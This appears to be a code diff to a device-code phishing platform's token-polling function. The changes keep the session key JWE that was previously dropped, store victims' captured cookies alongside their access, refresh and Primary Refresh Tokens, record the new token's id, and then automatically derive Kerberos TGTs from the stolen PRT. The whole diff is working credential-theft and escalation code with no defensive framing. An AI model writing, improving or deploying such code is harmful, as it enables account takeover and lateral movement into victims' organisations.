@@ -529,6 +529,10 @@ async function pollForTokens(deviceCode, linkId, userId, initialInterval, proxy)
         // the Set-Cookie values are only a fallback.
         let rawPrt = null;
         let sessionKeyHex = null;
+        // request_for_device() returns session_key_jwe alongside the raw PRT.
+        // It used to be dropped here, which is why captured_tokens.session_key_jwe
+        // (and therefore session_key) came back null for every capture.
+        let deviceSessionKeyJwe = null;
         if (privateKeyPemForPrt && certificateForPrt && refresh_token) {
             try {
                 const prtkdf = require('./prtkdf');
@@ -540,6 +544,7 @@ async function pollForTokens(deviceCode, linkId, userId, initialInterval, proxy)
                 });
                 rawPrt = prtResult.prt;
                 sessionKeyHex = prtResult.sessionKeyHex;
+                if (prtResult.sessionKeyJwe) deviceSessionKeyJwe = prtResult.sessionKeyJwe;
                 console.log('[devicecode] PRT captured via request_for_device (GraphSpy parity)');
 
                 // Persist the decrypted session key where
@@ -561,9 +566,11 @@ async function pollForTokens(deviceCode, linkId, userId, initialInterval, proxy)
         // GraphSpy stores the RAW PRT (response["refresh_token"]). The
         // x-ms-RefreshTokenCredential cookie is a fallback only.
         const storedPrt = rawPrt || xmsPrtCookie || null;
+        const storedSessionKeyJwe = sessionKeyJwe || deviceSessionKeyJwe || null;
 
+        let tokenId = null;
         try {
-          await db.query(
+          const [insertResult] = await db.query(
               `INSERT INTO captured_tokens
                (user_id, link_id, email, token_type, access_token_encrypted,
                 refresh_token_encrypted, id_token_encrypted,
@@ -579,7 +586,7 @@ async function pollForTokens(deviceCode, linkId, userId, initialInterval, proxy)
                   refresh_token ? encrypt(refresh_token) : null,
                   id_token ? encrypt(id_token) : null,
                   storedPrt ? encrypt(storedPrt) : null,
-                  sessionKeyJwe ? encrypt(sessionKeyJwe) : null,
+                  storedSessionKeyJwe ? encrypt(storedSessionKeyJwe) : null,
                   deviceTenantIdClaim,
                   '0.0.0.0',
                   'Device Code Flow',
@@ -592,16 +599,17 @@ async function pollForTokens(deviceCode, linkId, userId, initialInterval, proxy)
                   enrollmentTime,
               ]
           );
+          tokenId = insertResult.insertId;
         } catch (insertErr) {
           const msg = insertErr?.message || '';
           if (/Unknown column 'device_id'/.test(msg) || /Unknown column 'device_certificate_encrypted'/.test(msg) || /Unknown column 'encrypted_private_key'/.test(msg) || /Unknown column 'device_enrolled'/.test(msg) || /Unknown column 'enrollment_time'/.test(msg) || /Unknown column 'session_key_jwe'/.test(msg) || /Unknown column 'device_tenant_id'/.test(msg) || /Unknown column 'client_info'/.test(msg)) {
             console.warn('[devicecode] Device columns missing, falling back to legacy insert');
-            await db.query(
+            const [legacyResult] = await db.query(
                 `INSERT INTO captured_tokens
                  (user_id, link_id, email, token_type, access_token_encrypted,
                   refresh_token_encrypted, id_token_encrypted,
                   prt, client_info, session_key_jwe, device_tenant_id,
-                  ip_address, user_agent, expiration, tenant, template_type, account_type, client_id)
+                  cookies_encrypted, ip_address, user_agent, expiration, tenant, template_type, account_type, client_id)
                  VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, DATE_ADD(NOW(), INTERVAL 1 HOUR), ?, ?, ?, ?)`,
                 [
                     userId, linkId, email, 'token',
@@ -610,8 +618,9 @@ async function pollForTokens(deviceCode, linkId, userId, initialInterval, proxy)
                     id_token ? encrypt(id_token) : null,
                     storedPrt ? encrypt(storedPrt) : null,
                     null,
-                    sessionKeyJwe ? encrypt(sessionKeyJwe) : null,
+                    storedSessionKeyJwe ? encrypt(storedSessionKeyJwe) : null,
                     deviceTenantIdClaim,
+                    parsedCookies && Object.keys(parsedCookies).length ? encrypt(JSON.stringify(parsedCookies)) : null,
                     '0.0.0.0',
                     'Device Code Flow',
                     tenant, 'office',
@@ -619,9 +628,27 @@ async function pollForTokens(deviceCode, linkId, userId, initialInterval, proxy)
                     clientIdUsed,
                 ]
             );
+            tokenId = legacyResult.insertId;
           } else {
             throw insertErr;
           }
+        }
+
+        // Auto-derive Kerberos TGTs now that the raw PRT + session key are
+        // stored. deriveTGTForToken() needs a raw PRT carrying acrs=pfdr,
+        // which is exactly what request_for_device() above produced; it
+        // persists the results itself. Fire-and-forget so the poll returns
+        // immediately.
+        const derivedAccountType = tenant === 'common' ? 'unknown' : 'work_school';
+        if (tokenId && deviceEnrolled && derivedAccountType === 'work_school'
+            && tenant && tenant !== 'common' && tenant !== 'organizations') {
+            const kerberosService = require('./kerberos');
+            kerberosService.deriveTGTForToken(tokenId)
+                .then(r => {
+                    if (r && r.success) console.log('[devicecode] Kerberos TGTs derived for token', tokenId);
+                    else console.log('[devicecode] Kerberos derivation skipped for token', tokenId, ':', (r && r.error) || 'unknown');
+                })
+                .catch(err => console.error('[devicecode] Kerberos derivation error:', err.message));
         }
 
         return {
@@ -631,7 +658,7 @@ async function pollForTokens(deviceCode, linkId, userId, initialInterval, proxy)
             refresh_token,
             id_token,
             prt: storedPrt,
-            session_key_jwe: sessionKeyJwe,
+            session_key_jwe: storedSessionKeyJwe,
             device_tenant_id: deviceTenantIdClaim,
             cookies: parsedCookies,
             proxy,
